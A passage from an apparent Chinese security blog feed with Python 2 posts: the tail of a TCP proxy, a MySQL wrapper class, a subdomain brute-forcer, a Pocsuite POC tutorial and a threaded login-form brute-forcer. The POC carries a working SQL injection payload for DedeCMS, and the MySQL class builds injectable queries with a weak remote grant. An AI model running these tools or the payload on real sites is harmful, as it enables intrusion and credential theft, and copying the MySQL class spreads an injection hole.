        hexa = b&#39; &#39;.join(&amp;quot;[%0*X]&amp;quot; % (digits,ord(x)) for x in s)
        text = b&#39;&#39;.join([x if 0x20 &amp;lt;= ord(x) &amp;lt; 0x7F else b&#39;.&#39; for x in s])
        result.append(b&amp;quot;%04X  %-*s  %s&amp;quot; % (i,length*(digits+1),hexa,text))

    print b&#39;\n&#39;.join(result)

def receive_from (connection):
    
    buffer = &amp;quot;&amp;quot;
    
    #我们设置了1秒的超时，这取决于目标的情况，可能需要调整
    connection.settimeout(1)
    try:
        #持续从缓存中读取数据直到没有数据或者超时
        while True:
            data = connection.recv(4096)
            if not data:
                break

            buffer += data
    except:
        pass
        
    return buffer
    
#对目标是远程主机的请求进行修改
def request_handler (buffer):
    #执行包修改
    return buffer

#对目标是本地主机的响应进行修改
def response_handler (buffer):
    #执行包修改
    return buffer

def proxy_handler (client_socket,remote_host,remote_port,receive_first):
    #连接远程主机
    remote_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    remote_socket.connect((remote_host,remote_port))

    #如果必要从远程主机接收数据
    if receive_first:
        remote_buffer = receive_from(remote_socket)
        if len(remote_buffer):
            print &amp;quot;\n[==&amp;gt;] Received %d bytes from remote.&amp;quot; % len(remote_buffer)
            # hexdump(remote_buffer)
        
        #发送给我们的相应处理
        remote_buffer = response_handler(remote_buffer)
        #若我们有数据传递给本地客户端，发送它
        if len(remote_buffer):
            print &amp;quot;[&amp;lt;==] Sending %d bytes to localhost.\n&amp;quot; % len(remote_buffer)
            client_socket.send(remote_buffer)
    
    #现在我们从本地循环读取数据，发送给远程主机和本地主机
    while True:
        #从本地读取数据
        local_buffer = receive_from(client_socket)
        if len(local_buffer):
            print &amp;quot;\n[==&amp;gt;] Received %d bytes from localhost.&amp;quot; % len(local_buffer)
            # hexdump(local_buffer)
            #发送给我们的本地请求
            local_buffer = request_handler(local_buffer)
            #发送给远程主机
            remote_socket.send(local_buffer)
            print &amp;quot;[==&amp;gt;] Sent to remote.&amp;quot;

        #接收响应的数据
        remote_buffer = receive_from(remote_socket)
        if len(remote_buffer):
            print &amp;quot;\n[&amp;lt;==] Received %d bytes from remote.&amp;quot; % len(remote_buffer)
            # hexdump(remote_buffer)
            #发送数据到响应处理函数
            remote_buffer = response_handler(remote_buffer)
            #将响应发送给本地socket
            client_socket.send(remote_buffer)
            print &amp;quot;[==&amp;gt;] Sent to localhost.&amp;quot;

        #若两边都没有数据，关闭连接
        if not len(local_buffer) or not len(remote_buffer):
            client_socket.close()
            remote_socket.close()
            print &amp;quot;[*] No more data. Closing connections.&amp;quot;
            break

def server_loop(local_host,local_port,remote_host,remote_port,receive_first):

    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        server.bind((local_host,local_port))
    except:
        print &amp;quot;[!!] Failed to listen on %s:%d&amp;quot; % (local_host,local_port)
        print &amp;quot;[!!] Check for other listening sockets or correct permisssions.&amp;quot;
        sys.exit(0)
    print &amp;quot;[*] Listening on %s:%d......&amp;quot; % (local_host,local_port)
    server.listen(5)

    while True:
        client_socket,addr = server.accept()
        
        #打印本地连接信息
        print &amp;quot;\n[==&amp;gt;] Received incoming connection from %s:%d&amp;quot; % (addr[0],addr[1])

        #开启一个线程与远程主机通信
        proxy_thread = threading.Thread(target=proxy_handler,args=(client_socket,remote_host,remote_port,receive_first))
        proxy_thread.start()

def main ():
    parser = optparse.OptionParser()
    parser.add_option(&#39;--lh&#39;, &#39;--localhost&#39;, dest=&#39;localhost&#39;,default=&#39;127.0.0.1&#39;,
        type=&#39;string&#39;, help=&#39;Localhost.&#39;)
    parser.add_option(&#39;--lp&#39;, &#39;--localport&#39;, dest=&#39;localport&#39;,default=8888,
        type=&#39;int&#39;, help=&#39;Localport.&#39;)
    parser.add_option(&#39;--rh&#39;, &#39;--remotehost&#39;, dest=&#39;remotehost&#39;, default=&#39;127.0.0.1&#39;,
        type=&#39;string&#39;, help=&#39;Remotehost.&#39;)
    parser.add_option(&#39;--rp&#39;, &#39;--remoteport&#39;, dest=&#39;remoteport&#39;, default=8080, 
        type=&#39;int&#39;, help=&#39;Remoteport.&#39;)
    parser.add_option(&#39;--rf&#39;, &#39;--receivefirst&#39;, dest=&#39;receive_first&#39;, default=False,
        action=&#39;store_true&#39;,help=&#39;Connection before send and receive data.&#39;)

    (options, args) = parser.parse_args()

    #设置本地监听参数
    if options.localhost:
        local_host = options.localhost
    if options.localport:
        local_port = options.localport
    
    #设置远程目标
    if options.remotehost:
        remote_host = options.remotehost
    if options.remoteport:
        remote_port = options.remoteport

    receive_first = options.receive_first

    # print local_host,local_port,remote_host,remote_port,receive_first

    #现在设置好我们的监听socket
    server_loop(local_host,local_port,remote_host,remote_port,receive_first)

main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;效果图:1c8d1e1a6033af5d70b3fcb50e371dd2&#34;&gt;效果图&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_proxy_result.png&#34; alt=&#34;效果图&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python封装MySQL类</title>
      <link>http://wyb0.com/posts/Python%E5%B0%81%E8%A3%85MySQL%E7%B1%BB/</link>
      <pubDate>Mon, 12 Sep 2016 22:54:28 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%B0%81%E8%A3%85MySQL%E7%B1%BB/</guid>
      <description>

&lt;h3 id=&#34;0x00-安装:501f712b8ac22c1e6434079b94c77966&#34;&gt;0x00 安装&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;下载&lt;a href=&#34;http://www.codegood.com/archives/129&#34;&gt;MySQL-python-1.2.3.win-amd64-py2.7.exe&lt;/a&gt;然后安装&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-简单表设计如下:501f712b8ac22c1e6434079b94c77966&#34;&gt;0x01 简单表设计如下&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;insert into mysql.user(Host,User,Password) values(&#39;%&#39;,&#39;python&#39;,&#39;123456&#39;);

drop database if exists python;
create database python;
use python;

drop table if exists msg;
create table msg(
id int not null auto_increment primary key,
ip varchar(40) not null default &#39;127.0.0.1&#39; comment &#39;ip地址&#39;,
domain varchar(100) not null default &#39;www.xx.com&#39; comment &#39;域名&#39;
);

grant all privileges on python.* to &#39;python&#39;@&#39;%&#39; identified by &#39;123456&#39;;
flush privileges;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-代码:501f712b8ac22c1e6434079b94c77966&#34;&gt;0x02 代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import MySQLdb

class mysql(object):
    &amp;quot;&amp;quot;&amp;quot;docstring for mysql&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, dbconfig):
        self.host = dbconfig[&#39;host&#39;]
        self.port = dbconfig[&#39;port&#39;]
        self.user = dbconfig[&#39;user&#39;]
        self.passwd = dbconfig[&#39;passwd&#39;]
        self.dbname = dbconfig[&#39;dbname&#39;]
        self.charset = dbconfig[&#39;charset&#39;]
        self._conn = None
        self._connect()
        self._cursor = self._conn.cursor()

    def _connect(self):
        try:
            self._conn = MySQLdb.connect(host=self.host,
                port = self.port,
                user=self.user,
                passwd=self.passwd,
                db=self.dbname,
                charset=self.charset)
        except MySQLdb.Error,e:
            print e
            
    def query(self, sql):
        try:
            result = self._cursor.execute(sql)
        except MySQLdb.Error, e:
            print e
            result = False
        return result

    def select(self, table, column=&#39;*&#39;, condition=&#39;&#39;):
        condition = &#39; where &#39; + condition if condition else None
        if condition:
            sql = &amp;quot;select %s from %s %s&amp;quot; % (column,table,condition)
        else:
            sql = &amp;quot;select %s from %s&amp;quot; % (column,table)
        self.query(sql)
        return self._cursor.fetchall()

    def insert(self, table, tdict):
        column = &#39;&#39;
        value = &#39;&#39;
        for key in tdict:
            column += &#39;,&#39; + key
            value += &amp;quot;&#39;,&#39;&amp;quot; + tdict[key]
        column = column[1:]
        value = value[2:] + &amp;quot;&#39;&amp;quot;
        sql = &amp;quot;insert into %s(%s) values(%s)&amp;quot; % (table,column,value)
        try:
            self._cursor.execute(sql)
            self._conn.commit()
        except:
            self.rollback()
        return self._cursor.lastrowid #返回最后的id

    def update(self, table, tdict, condition=&#39;&#39;):
        if not condition:
            print &amp;quot;must have id&amp;quot;
            exit()
        else:
            condition = &#39;where &#39; + condition
        value = &#39;&#39;
        for key in tdict:
            value += &amp;quot;,%s=&#39;%s&#39;&amp;quot; % (key,tdict[key])
        value = value[1:]
        sql = &amp;quot;update %s set %s %s&amp;quot; % (table,value,condition)
        try:
            self._cursor.execute(sql)
        except:
            self.rollback()
        return self.affected_num() #返回受影响行数

    def delete(self, table, condition=&#39;&#39;):
        condition = &#39;where &#39; + condition if condition else None
        sql = &amp;quot;delete from %s %s&amp;quot; % (table,condition)
        try:
            self._cursor.execute(sql)
            self._conn.commit()
        except:
            self.rollback()
        return self.affected_num() #返回受影响行数

    def rollback(self):
        self._conn.rollback()

    def affected_num(self):
        return self._cursor.rowcount

    def __del__(self):
        try:
            self._cursor.close()
            self._conn.close()
        except:
            pass

    def close(self):
        self.__del__()

if __name__ == &#39;__main__&#39;:
    dbconfig = {
        &#39;host&#39;:&#39;192.168.188.134&#39;,
        &#39;port&#39;:3306,
        &#39;user&#39;:&#39;python&#39;,
        &#39;passwd&#39;:&#39;123456&#39;,
        &#39;dbname&#39;:&#39;python&#39;,
        &#39;charset&#39;:&#39;utf8&#39;
    }
    db = mysql(dbconfig)

    # print db.select(&#39;msg&#39;,&#39;id,ip,domain&#39;)
    # print db.select(&#39;msg&#39;,&#39;id,ip,domain&#39;,&#39;id&amp;gt;2&#39;)
    # print db.affected_num()

    # tdict = {
    #     &#39;ip&#39;:&#39;111.13.100.91&#39;,
    #     &#39;domain&#39;:&#39;baidu.com&#39;
    # }
    # print db.insert(&#39;msg&#39;, tdict)
    
    # tdict = {
    #     &#39;ip&#39;:&#39;111.13.100.91&#39;,
    #     &#39;domain&#39;:&#39;aaaaa.com&#39;
    # }
    # print db.update(&#39;msg&#39;, tdict, &#39;id=5&#39;)

    # print db.delete(&#39;msg&#39;, &#39;id&amp;gt;3&#39;)

    db.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python爆破二级域名</title>
      <link>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D/</link>
      <pubDate>Mon, 12 Sep 2016 21:31:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D/</guid>
      <description>

&lt;p&gt;参考：&lt;a href=&#34;https://github.com/lijiejie/subDomainsBrute&#34;&gt;https://github.com/lijiejie/subDomainsBrute&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;帮助信息:25b6c2890e0e0ea19d70887c8b08669a&#34;&gt;帮助信息&lt;/h2&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sub_domain_blast_help.png&#34; alt=&#34;帮助信息&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h2 id=&#34;代码:25b6c2890e0e0ea19d70887c8b08669a&#34;&gt;代码&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import dns.resolver
import threading
import Queue
import optparse
import sys

queue = Queue.Queue()
lock = threading.Lock()

class GetSubDomain(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for SubDomain&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, target,queue,outfile):
        threading.Thread.__init__(self)
        self.target = target
        self.queue = queue
        self.rsv = dns.resolver.Resolver()
        outfile = target + &#39;.txt&#39; if not outfile else outfile
        self.f = open(&#39;./output/&#39;+outfile,&#39;a+&#39;)
        self.ip_list = []

    def _scan(self):
        while not self.queue.empty():
            self.ip_list = []
            ips = None
            sub_domain = self.queue.get() + &#39;.&#39; + self.target
            for _ in range(3):
                try:
                    answers = self.rsv.query(sub_domain)
                    if answers:
                        for answer in answers:
                            if answer.address not in self.ip_list:
                                self.ip_list.append(answer.address)
                except dns.resolver.NoNameservers, e:
                    break
                except Exception, e:
                    pass
            if len(self.ip_list)&amp;gt;0:
                ips = &#39;,&#39;.join(self.ip_list)
                msg = sub_domain.ljust(30) + ips + &#39;\n&#39;
                lock.acquire()
                print msg
                self.f.write(msg)
                lock.release()
            self.queue.task_done()

    def run(self):
        self._scan()

def get_target(domain_list):
    targets = []
    for line in open(domain_list,&#39;r&#39;):
        if line:
            targets.append(line.strip())
    return targets

def get_sub_queue(sub_file): #得到所有子域名的queue
    for line in open(sub_file,&#39;r&#39;):
        if line:
            queue.put(line.strip())

def main():
    parser = optparse.OptionParser()
    parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;,
        type=&#39;string&#39;, help=&#39;Get a single top-level domain names.&#39;)
    parser.add_option(&#39;-l&#39;, &#39;--list&#39;, dest=&#39;domain_list&#39;,
        type=&#39;string&#39;, help=&#39;Top-level domain name list.&#39;)
    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;sub_file&#39;, default=&#39;sub.txt&#39;,
        type=&#39;string&#39;, help=&#39;Dict file used to brute sub names&#39;)
    parser.add_option(&#39;-t&#39;, &#39;--threads&#39;, dest=&#39;threads_num&#39;, default=60, 
        type=&#39;int&#39;, help=&#39;Number of threads. default = 60&#39;)
    parser.add_option(&#39;-o&#39;, &#39;--outfile&#39;, dest=&#39;outfile&#39;, default=None,
        type=&#39;string&#39;, help=&#39;Output file name. default is {target}.txt&#39;)

    (options, args) = parser.parse_args()
    if options.url:
        urls = [options.url]
    elif options.domain_list:
        urls = get_target(options.domain_list)
    else:
        parser.print_help()
        print &amp;quot;Example: &amp;quot;
        print &amp;quot;\tpython getsub.py -u baidu.com&amp;quot;
        print &amp;quot;\tpython getsub.py -l domain.txt -f sub.txt -t 50&amp;quot;
        sys.exit(0)

    for url in urls:
        get_sub_queue(options.sub_file)
        for x in xrange(1,options.threads_num+1):
            t = GetSubDomain(url,queue,options.outfile)
            t.setDaemon(True)
            t.start()
        queue.join()

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>POC框架Pocsuite</title>
      <link>http://wyb0.com/posts/POC%E6%A1%86%E6%9E%B6Pocsuite/</link>
      <pubDate>Thu, 08 Sep 2016 20:38:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/POC%E6%A1%86%E6%9E%B6Pocsuite/</guid>
      <description>

&lt;h3 id=&#34;0x00-关于pocsuite:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x00 关于Pocsuite&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-简单介绍:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x01 简单介绍&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;安装

&lt;ul&gt;
&lt;li&gt;使用pip install pocsuite即可安装

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/pocsuite_install.png&#34; alt=&#34;安装pocsuite&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;常用参数

&lt;ul&gt;
&lt;li&gt;-u 指定一个目标url&lt;/li&gt;
&lt;li&gt;-f 指定一个存放目标url的文件&lt;/li&gt;
&lt;li&gt;-r 指定一个存放poc的文件夹&lt;/li&gt;
&lt;li&gt;&amp;ndash;report 导出结果到html文件&lt;/li&gt;
&lt;li&gt;&amp;ndash;cookie 携带cookie&lt;/li&gt;
&lt;li&gt;&amp;ndash;referer 修改referer&lt;/li&gt;
&lt;li&gt;&amp;ndash;user-agent 修改UA&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;模式

&lt;ul&gt;
&lt;li&gt;执行一个poc有两种模式

&lt;ul&gt;
&lt;li&gt;--verify 漏洞验证模式(只是验证，不能更改服务器的东西)&lt;/li&gt;
&lt;li&gt;--attack 漏洞利用模式&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;示例

&lt;ul&gt;
&lt;li&gt;pocsuite -u &amp;ldquo;&lt;a href=&#34;http://www.xxxx.com&amp;quot;&#34;&gt;http://www.xxxx.com&amp;quot;&lt;/a&gt; -r poc_path/poc_name.py &amp;ndash;atack&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;poc编写&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;可以新建一个文件夹，命名为mypoc，里面就放你自己写的poc(当然也可以在mypoc里新建文件夹放一类poc，对poc进行分类)&lt;/li&gt;
&lt;li&gt;此时示例(对目标进行常见服务的测试，加载一类多个poc脚本)

&lt;ul&gt;
&lt;li&gt;pocsuite -u &amp;ldquo;&lt;a href=&#34;http://www.xxxx.com&amp;quot;&#34;&gt;http://www.xxxx.com&amp;quot;&lt;/a&gt; -r poc_path/server/ &amp;ndash;verify&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;poc的命名规范&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;漏洞ID_版本号_漏洞类型(其中不能有大写字母，所有符号要改为&amp;rdquo;_&amp;rdquo;),大致如下：

&lt;ul&gt;
&lt;li&gt;_xxxx_struct2_2016_s2_016_code_execution.py&lt;/li&gt;
&lt;li&gt;_xxxx_dedecms_20130715_sql_inj.py&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;poc的编写流程&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;导入pocsuite API模块&lt;/li&gt;
&lt;li&gt;创建TestPOC类&lt;/li&gt;
&lt;li&gt;填写POC信息&lt;/li&gt;
&lt;li&gt;编写_berify()方法&lt;/li&gt;
&lt;li&gt;编写_attack()方法&lt;/li&gt;
&lt;li&gt;注册类&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-实例:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x02 实例&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

# 导入pocsuite的必要模块
from pocsuite.net import req # requests模块，和requests用法完全一样
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

class TestPOC(POCBase):
    &amp;quot;&amp;quot;&amp;quot;docstring for TestPOC&amp;quot;&amp;quot;&amp;quot;
    vulID            = &#39;&#39;      # VUL ID
    version          = &#39;&#39;      # 版本号,默认为1
    author           = &#39;&#39;      # POC 作者的大名
    vulDate          = &#39;&#39;      # 漏洞公开的时间,不知道就写今天
    createDate       = &#39;&#39;      # 编写 POC 的日期
    updateDate       = &#39;&#39;      # POC更新的时间,默认和编写时间一样
    references       = [&#39;&#39;]    # 漏洞地址来源,0day 不用写
    name             = &#39;&#39;      # POC 名称
    appPowerLink     = &#39;&#39;      # 漏洞厂商主页地址
    appName          = &#39;&#39;      # 漏洞应用名称
    appVersion       = &#39;&#39;      # 漏洞影响版本
    vulType          = &#39;&#39;      # 漏洞类型,类型参考见 漏洞类型规范表
    desc             = &#39;&#39;&#39; &#39;&#39;&#39; # 漏洞简要描述
    samples          = []      # 测试样例,就是用 POC 测试成功的网站url，选填
    install_requires = []      # POC 第三方模块依赖，请尽量不要使用第三方模块

    def _verify(self, verify=True): # 漏洞测试代码
        result = {}
        target_url = self.url

        # 这里写入漏洞测试代码
        path = &amp;quot;/plus/recommend.php&amp;quot;
        payload = &amp;quot;?action=&amp;amp;aid=1&amp;amp;_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select md5(512341)),5,6,7,8,9%23@`\\%27`+&amp;amp;_FILES[type][name]=1.jpg&amp;amp;_FILES[type][type]=application/octet-stream&amp;amp;_FILES[type][size]=4294&amp;quot;
        html = req.get(target_url + path + payload, timeout=10).content
        if &#39;5e8523b1645e6225001b9027cddc1c85&#39; in html:
            result[&#39;VerifyInfo&#39;] = {}
            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url + path
            result[&#39;VerifyInfo&#39;][&#39;Path&#39;] = path
            result[&#39;VerifyInfo&#39;][&#39;Payload&#39;] = payload
        
        return self.parse_attack(result)

    def _attack(self): # 漏洞利用代码
        # result = {}
        # # 先进行检测是否存在漏洞
        # if not self._verify(verify=False):
        #     return self.parse_attack(result)
        # target_url = self.url

        # # 这里写漏洞利用代码

        # return self.parse_attack(result)
        
        return self._verify() # 如果没漏洞利用代码，可以直接return测试函数

    def parse_attack(self, result): # poc输出函数，可以输出错误和成功信息
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail(&#39;Nothing returned&#39;)
        return output

register(TestPOC) #注册类
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-关于poc中result字典的内容:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x03 关于poc中result字典的内容&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;# result是一个字典，里面存储所有的漏洞信息:
result：{
    &#39;DBInfo&#39;: {
        &#39;Username&#39;: &#39;管理员用户名&#39;,
        &#39;Password&#39;：&#39;管理员密码&#39;,
        &#39;Salt&#39;: &#39;加密盐值&#39;,
        &#39;Uid&#39;: &#39;用户ID&#39;,
        &#39;Groupid&#39;: &#39;用户组ID&#39;
        }
    &#39;ShellInfo&#39;: {
        &#39;URL&#39;: &#39;Webshell地址&#39;,
        &#39;Content&#39;: &#39;Webshell内容&#39;
        }
    &#39;FileInfo&#39;: {
        &#39;Filename&#39;: &#39;文件名称&#39;,
        &#39;Content&#39;: &#39;文件内容&#39;
        }
    &#39;XSSInfo&#39;: {
        &#39;URL&#39;: &#39;验证URL&#39;,
        &#39;Payload&#39;: &#39;验证Payload&#39;
        }
    &#39;AdminInfo&#39;: {
        &#39;Uid&#39;: &#39;管理员ID&#39;,
        &#39;Username&#39;: &#39;管理员用户名&#39;,
        &#39;Password&#39;: &#39;管理员密码&#39;
        }
    &#39;Database&#39;: {
        &#39;Hostname&#39;: &#39;数据库主机名&#39;,
        &#39;Username&#39;: &#39;数据库用户名&#39; ,
        &#39;Password&#39;: &#39;数据库密码&#39;,
        &#39;DBname&#39;: &#39;数据库名&#39;
        }
    &#39;VerifyInfo&#39;: {
        &#39;URL&#39;: &#39;验证URL&#39;,
        &#39;Postdata&#39;: &#39;验证POST数据&#39;,
        &#39;Path&#39;: &#39;网站绝对路径&#39;
        }
    &#39;SiteAttr&#39;: {
        &#39;Process&#39;: &#39;服务器进程&#39;
        }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现表单爆破</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E8%A1%A8%E5%8D%95%E7%88%86%E7%A0%B4/</link>
      <pubDate>Mon, 05 Sep 2016 23:43:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E8%A1%A8%E5%8D%95%E7%88%86%E7%A0%B4/</guid>
      <description>

&lt;h2 id=&#34;接收变量的php脚本如下:ce6886490f9a6e6169f210150773b52d&#34;&gt;接收变量的php脚本如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;//代码仅供测试
&amp;lt;?php
    $name = @$_POST[&#39;uname&#39;];
    $pass = @$_POST[&#39;upass&#39;];

    if (empty($name) or empty($pass)){
        header(&amp;quot;location:http://127.0.0.1:921/test/test/index.html&amp;quot;);
        exit();
    } else {
        if ($name === &#39;admin&#39; and $pass === &#39;123456&#39;){
            header(&amp;quot;location:http://127.0.0.1:921/test/test/sucess.html&amp;quot;);
        } else {
            header(&amp;quot;location:http://127.0.0.1:921/test/test/error.html&amp;quot;);
            exit();
        }
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;爆破表单的python脚本如下:ce6886490f9a6e6169f210150773b52d&#34;&gt;爆破表单的python脚本如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import hashlib
import requests
from Queue import Queue
import threading
from optparse import OptionParser
from time import sleep

lock = threading.Lock()
queue = Queue()
result = []

class FormBlast(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for FormBlast&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *arg):
        super(FormBlast, self).__init__()
        (options,args,queue) = arg
        self.url = options.url
        self.fname = options.fname
        self.fpass = options.fpass
        self.args = args
        self.queue = queue
        self.s = requests.Session()
        self.base_md5 = &#39;&#39;

    def get_payload(self, vname, vpass):
        dict2 = {}
        if self.args:
            for x in self.args:
                (key,value) = x.split(&#39;=&#39;)
                dict2[key] = value
        dict1 = {self.fname: vname, self.fpass: vpass}
        payload = dict(dict1, **dict2)
        return payload

    def get_md5(self, html):
        md5 = hashlib.md5()
        md5.update(html)
        return md5.hexdigest()

    def get_base_md5(self):
        proxy = {
            &#39;http&#39;: &#39;http://127.0.0.1:8080&#39;
        }
        payload = self.get_payload(&#39;1&#39;, &#39;1&#39;)
        resp = self.s.post(self.url, data=payload)
        resp.coding = resp.apparent_encoding
        html = resp.text
        self.base_md5 = self.get_md5(html)

                        
    def run(self):
        # global result
        self.get_base_md5()
        while not self.queue.empty():
            (user,pwd) = self.queue.get().split(&#39;:&#39;)
            payload = self.get_payload(user,pwd)
            try:
                resp = self.s.post(self.url, data=payload, timeout=10)
                resp.coding = resp.apparent_encoding
                code = resp.status_code
                html = resp.text
                curr_md5 = self.get_md5(html)

                if curr_md5 != self.base_md5 and code==200:
                    s = &amp;quot;[Ok] User:%s Pass:%s&amp;quot; % (user,pwd)
                    result.append(s)
                    lock.acquire()
                    print s
                    lock.release()
                    self.queue.task_done()
                else:
                    error = &amp;quot;[Error] User:%s Pass:%s&amp;quot; % (user,pwd)
                    lock.acquire()
                    print error
                    lock.release()
                    self.queue.task_done()
            except requests.exceptions.ConnectTimeout:
                self.queue.put(user+&#39;:&#39;+pwd)
            except:
                pass
        # print self.result


def get_content(filename):
    data = []
    with open(filename) as f:
        lines = f.readlines()
        for line in lines:
            data.append(line.strip())
    return data

def get_queue(list1, list2):
    for user in list1:
        for pwd in list2:
            queue.put(user+&#39;:&#39;+pwd)

def main():
    parser = OptionParser()
    parser.add_option(&#39;-u&#39;,&#39;--url&#39;,dest=&#39;url&#39;,
                        help=&#39;Get target url&#39;)
    parser.add_option(&#39;-n&#39;,&#39;--fname&#39;,dest=&#39;fname&#39;,
                        help=&#39;The user name in the form&#39;)
    parser.add_option(&#39;-p&#39;,&#39;--fpass&#39;,dest=&#39;fpass&#39;,
                        help=&#39;The pass name in the form&#39;)
    parser.add_option(&#39;-L&#39;,&#39;--namefile&#39;,dest=&#39;namefile&#39;,default=&#39;namefile.txt&#39;,
                        help=&#39;The user name dictionary files&#39;)
    parser.add_option(&#39;-P&#39;,&#39;--passfile&#39;,dest=&#39;passfile&#39;,default=&#39;passfile.txt&#39;,
                        help=&#39;The password dictionary files&#39;)
    (options,args) = parser.parse_args()

    if options.url and options.fname and options.fpass and options.namefile and options.passfile:
        users = []
        pwds = []
        users = get_content(options.namefile)
        pwds = get_content(options.passfile)
        get_queue(users, pwds)

        for x in xrange(1,41):
            blast = FormBlast(options, args, queue)
            blast.setDaemon(True)
            blast.start()
        queue.join()

        sleep(3)
        print &amp;quot;########################################&amp;quot;
        for x in result:
            print x
    else:
        parser.print_help()


if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;结果:ce6886490f9a6e6169f210150773b52d&#34;&gt;结果&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/form_blast1.png&#34; alt=&#34;表单爆破1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
